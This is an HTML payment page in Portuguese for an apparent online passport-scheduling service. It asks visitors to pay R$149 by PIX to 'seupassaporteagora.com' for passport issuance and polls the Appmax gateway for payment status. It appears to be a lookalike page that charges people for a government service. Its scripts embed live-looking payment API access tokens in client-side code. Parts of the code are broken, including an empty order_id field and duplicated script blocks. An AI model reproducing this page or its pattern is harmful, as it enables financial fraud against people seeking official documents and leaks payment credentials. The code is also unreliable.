
<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Agendamento de Passaporte</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="../css/style.css">
    <style>
        .container {
            box-shadow: none;
        }

        .navbar {
            height: 180px;
            padding: 0 30px;
        }

        input[type="text"],
        input[type="email"],
        input[type="password"],
        input[type="tel"],
        input[type="number"] {
            touch-action: manipulation;
        }
        /* Reset CSS */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

/* Body styling */
body {
    font-family: 'Roboto', sans-serif;
    background-color: #f2f2f2;
    line-height: 1.6;
}

/* Header styling */
.navbar-light .navbar-nav .nav-link {
    color: #0033a0;
}

.navbar {
    background-color: white;
    padding: 20px 30px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.navbar-brand {
    display: flex;
    align-items: center;
}

.navbar-brand img {
    width: 200px;
    margin-right: 15px;
}

.nav-link {
    font-family: sans-serif;
    color: #0033a0;
    font-size: 20px;
    margin: 0 20px;
    font-weight: 500;
}

.nav-link:hover {
    color: #0033a0;
}

.dropdown-menu a {
    color: #0033a0;
    font-size: 18px;
}

.dropdown-menu a:hover {
    background-color: #f4f4f4;
}

/* Steps styling */
.steps {
    display: flex;
    justify-content: space-between;
    margin-bottom: 20px;
    padding: 0 20px;
}

.steps div {
    flex: 1;
    text-align: center;
    padding: 15px 10px;
    background-color: #e9ecef;
    border: 1px solid #ced4da;
    border-radius: 4px;
    margin: 0 5px;
    font-weight: bold;
    font-size: 1.1em;
    transition: background-color 0.3s, color 0.3s;
}

.steps .active {
    background-color: #0d244f;
    color: white;
}

.steps .completed {
    background-color: #28a745;
    color: white;
}

.steps div:hover {
    background-color: #007bff;
    color: white;
}

/* Container styling */
.container {
    padding: 20px;
}

/* Form styling */
form {
    display: flex;
    flex-direction: column;
    border-radius: 6px;
    padding: 20px;
    background: #fbfbfb;
    margin: 20px 0; /* Margin top and bottom for spacing */
}

form label {
    margin: 14px 0 0px; /* Reduced margins */
    font-weight: bold;
    color: #333;
    font-size: 0.9em; /* Smaller font size */
    display: flex;
}

form input, form select, form button {
    margin: 5px 0; /* Reduced margins */
    padding: 8px 10px;
    font-size: 0.9em; /* Smaller font size */
    border: 1px solid #ccc;
    border-radius: 4px;
    transition: all 0.3s ease;
}

form input:focus, form select:focus {
    border-color: #007bff;
    box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
    outline: none;
}

form button {
    background-color: #28a745;
    color: white;
    border: none;
    cursor: pointer;
    padding: 10px;
    font-size: 1em; /* Smaller font size */
    border-radius: 4px;
    transition: background-color 0.3s ease;
}

form button:hover {
    background-color: #218838;
}

.required {
    color: red;
    margin-left: 10px;
}
/* Radio button styling */
.radio-group {
    display: flex;
    flex-direction: column;
    gap: 10px;
}

.radio-group input[type="radio"] {
    display: none;
}

.radio-group label {
    position: relative;
    padding-left: 30px;
    cursor: pointer;
    user-select: none;
    font-size: 0.9em;
    color: #333;
}

.radio-group label:before {
    content: "";
    position: absolute;
    left: 0;
    top: 50%;
    transform: translateY(-50%);
    width: 20px;
    height: 20px;
    border: 2px solid #ccc;
    border-radius: 50%;
    background: #fff;
    transition: border-color 0.3s, background 0.3s;
}

.radio-group input[type="radio"]:checked + label:before {
    border-color: #007bff;
    background: #007bff;
}

.radio-group label:after {
    content: "";
    position: absolute;
    left: 6px;
    top: 50%;
    transform: translateY(-50%) scale(0);
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: #fff;
    transition: transform 0.3s;
}

.radio-group input[type="radio"]:checked + label:after {
    transform: translateY(-50%) scale(1);
}

/* Footer styling */
.footer {
    background-color: #1e3a5f;
    color: white;
    text-align: center;
    padding: 20px 0;
    position: relative;
    bottom: 0;
    width: 100%;
}

.footer p {
    margin: 0;
}

/* Loading styling */
.loading-message {
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    font-size: 1.2em;
    color: #555;
}

.loading-message svg {
    margin-top: 10px;
}

/* Hidden class */
.hidden {
    display: none;
}

/* Responsive design */
@media (max-width: 768px) {
    .container {
        padding: 10px;
    }
    
    .steps div {
        padding: 10px;
    }
    
    form button {
        font-size: 1em;
        padding: 10px;
    }
    
    form input, form select, form button {
        padding: 8px;
        font-size: 0.9em;
    }
}

@media (max-width: 480px) {
    .steps {
        flex-direction: column;
    }
    
    .steps div {
        margin-bottom: 10px;
    }
}
.hidden {
    display: none;
}

    </style>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-11169322934"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'AW-11169322934');
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.6/jquery.inputmask.min.js"></script>
    <script>
        $(document).ready(function() {
            $("#data_nascimento").inputmask("99/99/9999");
        });
        $(document).ready(function() {
            $("#data_emissao").inputmask("99/99/9999");
        });
    </script>
</head>

<body>
    <nav class="navbar navbar-expand-lg navbar-light mb-5">
        <div class="container">
            <a class="navbar-brand" href="#">
                <img src="passaport.png" alt="Logo">
            </a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            Serviços
                        </a>
                        <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                            <a class="dropdown-item" href="dados-pessoais.php">Emissão de Passaporte</a>
                            <a class="dropdown-item" href="dados-pessoais.php">Renovação de Passaporte</a>
                        </div>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">Fale Conosco</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
</body>

</html>
<script>
    document.addEventListener('DOMContentLoaded', () => {
        const qrcode = "";
        const accessToken = "APP_USR-3351448130254305-011111-9f95cbd9ac605a6d621babe62e2e8999-1615521252";

        if (qrcode) {
            const qrcodeContainer = document.querySelector('.qrcode');
            const qrcodeImage = document.createElement('img');
            qrcodeImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrcode)}`;
            qrcodeContainer.appendChild(qrcodeImage);
        }

        function startCountdown(duration, display) {
            let timer = duration,
                minutes, seconds;
            setInterval(() => {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    timer = duration;
                }
            }, 1000);
        }

        function checkPaymentStatus() {
            const url = 'https://admin.appmax.com.br/api/v3/order/delivery-tracking-code';
            const data = {
                "access-token": "AA676386-A65482FF-381BA22E-0C8856A2",
                "order_id": ,
                "delivery_tracking_code": "abcd"
            };

            fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.data.order.status === 'aprovado') {
                        window.location.href = 'obrigado.php';
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        const countdownDisplay = document.getElementById('countdown');
        if (countdownDisplay) {
            startCountdown(3600, countdownDisplay); // 1 hour countdown
        }

        setInterval(checkPaymentStatus, 3000); // Check payment status every 30 seconds

        document.getElementById('payment-step1').style.display = 'block';
    });

    function copyQrCode() {
        const qrcode = "";
        navigator.clipboard.writeText(qrcode).then(() => {
            alert('QR Code copiado para a área de transferência!');
        }).catch(err => {
            alert('Erro ao copiar QR Code: ', err);
        });
    }

    function showStep2() {
        document.getElementById('payment-step1').style.display = 'none';
        document.getElementById('payment-step2').style.display = 'block';
    }
</script>

<!-- Font Awesome CSS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

<div class="container">
    <div class="steps">
        <div class="step completed">Dados Pessoais</div>
        <div class="step completed">Documentos</div>
        <div class="step completed">Dados Complementares</div>
        <div class="step active">Pagamentosss</div>
    </div>
    <div id="payment-step1" class="payment-step">
        <form>
            <div class="form-group">
                <table class="table">
                    <thead>
                        <tr>
                            <th>Serviço</th>
                            <th>Taxa</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Emissão de Passaporte</td>
                            <td>R$ 149,00</td>
                        </tr>
                        <tr>
                            <td>Total</td>
                            <td>R$ 149,00</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <h3 class="mt-4 payment-title">Pague com PIX e finalize sua inscrição agora!</h3>
            <div class="form-group payment-instructions">
                <div class="step-icons">
                    <div class="step-icon">
                        <div class="icon-circle"><i class="fas fa-mobile-alt"></i></div>
                        <p>Finalize a sua compra e abra o app do banco na opção Pix.</p>
                    </div>
                    <div class="step-icon">
                        <div class="icon-circle"><i class="fas fa-camera"></i></div>
                        <p>Aponte a câmera do celular para o QR Code ou copie e cole o código Pix.</p>
                    </div>
                    <div class="step-icon">
                        <div class="icon-circle"><i class="fas fa-check-circle"></i></div>
                        <p>Confira os dados e confirme o seu pagamento pelo app do Banco.</p>
                    </div>
                    <div class="step-icon">
                        <div class="icon-circle"><i class="fas fa-envelope"></i></div>
                        <p>Assim que o pagamento for identificado, enviaremos uma mensagem de confirmação.</p>
                    </div>
                </div>
            </div>
            <div class="form-group">
                <p class="privacy-notice">Os seus dados pessoais serão utilizados para processar a sua compra, apoiar a sua experiência em todo este site e para outros fins descritos na nossa política de privacidade.</p>
            </div>
            <div class="form-group terms-container">
                <input type="checkbox" id="termos" name="termos" required>
                <label for="termos">Li e concordo com os termos e condições do site</label>
            </div>
            <button type="button" class="btn btn-success btn-lg btn-block" onclick="showStep2()">Finalizar pedido</button>
            <a href="dados-complementares.php" class="btn btn-secondary btn-lg btn-block">Voltar</a>
        </form>
    </div>
    <div id="payment-step2" class="payment-step" style="display: none;">
        <div class="qrcode-container">
            <p class="text-center msg-payment nome">Olá, 1!</p>
            <p class="text-center msg-payment">Recebemos o seu pedido. <br> Sua certidão será enviada após o pagamento. </p>
            <p></p>
            <p class="msg-payment mb-5">Segue abaixo a forma de pagamento selecionada.</p>
            <div class="d-flex justify-content-around">
                <div class="d-flex flex-column scan-qrcode-container">
                    <p>Leia o <b>QRCode</b> abaixo com o aplicativo <b>do seu banco</b> e realize o pagamento do Pix para continuar:</p>
                    <div class="qrcode text-center">
                        <!-- QR Code will be injected here -->
                    </div>
                </div>
                <div class="timer-container d-flex flex-column">
                    <div class="waiting-payment">
                        <div class="spinner-border" role="status">
                            <span class="sr-only">Loading...</span>
                        </div>
                        <p>AGUARDANDO PAGAMENTO...</p>
                    </div>
                    <h5>O QR Code irá expirar em:</h5>
                    <div class="timer-item-loading">
                        <div id="countdown">59:58</div>

                    </div>
                    <p class="loading-legend">
                        <i>
                            Após finalizar o pagamento, você pode continuar nessa página para aguardar a confirmação do pagamento ou fechá-la. Você receberá uma notificação assim que o pagamento for confirmado.
                        </i>
                    </p>
                </div>
            </div>
            <div class="info-qrcode-container">
                <div class="text-left mt-4">
                    <div class="ou-styled">
                        <b>Ou</b>
                    </div>
                    <p class="mt-3">Copie o Código Pix abaixo e insira na opção <b>Pix Copia e Cola</b> no aplicativo do seu banco para realizar o pagamento do Pix:</p>
                    <b>PIX COPIA & COLA</b>
                    <div class="code-box">
                                            </div>
                    <button type="button" class="btn btn-success" onclick="copyQrCode()">Copiar Pix Copia & Cola</button>
                </div>
            </div>
        </div>
    </div>
</div>

<footer class="footer mt-5">
    <div class="container">
        <div class="row justify-content-center">
            <img width="200px" src="agendar-light.png" alt="Logo">
        </div>
        <div class="line"></div>
        <div class="row">
            <div class="col-md-6 mt-3">
                <p><strong>Contato:</strong></p>
                <p>Email: contato@seupassaporteagora.com/</p>
                <p>Telefone: (11) 1234-5677</p>
            </div>
            <div class="col-md-6 mt-3 ">
                <p><strong>SAC:</strong></p>
                <p>Horário de Atendimento: Seg - Sex: 08h às 17h30</p>
            </div>
        </div>
    </div>
    <div class="footer-text-container">
        <p class="footer-text">© 2024 - Agendamento Passaporte Online. Todos os Direitos Reservados.</p>
    </div>
    
</footer>
</body>
</html>
<script>
        document.addEventListener('DOMContentLoaded', () => {
            try {
                const qrcode = "";
                if (qrcode) {
                    const qrcodeContainer = document.querySelector('.qrcode');
                    const qrcodeImage = document.createElement('img');
                    qrcodeImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrcode)}`;
                    qrcodeContainer.appendChild(qrcodeImage);
                }

                function startCountdown(duration, display) {
                    let timer = duration,
                        minutes, seconds;
                    setInterval(() => {
                        minutes = parseInt(timer / 60, 10);
                        seconds = parseInt(timer % 60, 10);
                        minutes = minutes < 10 ? "0" + minutes : minutes;
                        seconds = seconds < 10 ? "0" + seconds : seconds;
                        display.textContent = minutes + ":" + seconds;
                        if (--timer < 0) {
                            timer = duration;
                        }
                    }, 1000);
                }

                function checkPaymentStatus() {
                    const url = 'https://admin.appmax.com.br/api/v3/order/delivery-tracking-code';
                    const data = {
                        "access-token": "AA676386-A65482FF-381BA22E-0C8856A2",
                        "order_id": "",
                        "delivery_tracking_code": "abcd"
                    };

                    fetch(url, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data)
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.data.order.status === 'aprovado') {
                                window.location.href = 'obrigado.php';
                            }
                        })
                        .catch(error => console.error('Error:', error));
                }

                const countdownDisplay = document.getElementById('countdown');
                if (countdownDisplay) {
                    startCountdown(3600, countdownDisplay); // 1 hour countdown
                }

                setInterval(checkPaymentStatus, 30000); // Check payment status every 30 seconds

                document.getElementById('payment-step1').style.display = 'block';
            } catch (error) {
                console.error('Erro ao inicializar a página:', error);
            }
        });

        function copyQrCode() {
            try {
                const qrcode = "";
                navigator.clipboard.writeText(qrcode).then(() => {
                    alert('QR Code copiado para a área de transferência!');
                }).catch(err => {
                    alert('Erro ao copiar QR Code: ', err);
                });
            } catch (error) {
                console.error('Erro ao copiar QR Code:', error);
            }
        }

        function showStep2() {
            try {
                document.getElementById('payment-step1').style.display = 'none';
                document.getElementById('payment-step2').style.display = 'block';
            } catch (error) {
                console.error('Erro ao mostrar o passo 2:', error);
            }
        }
    </script>
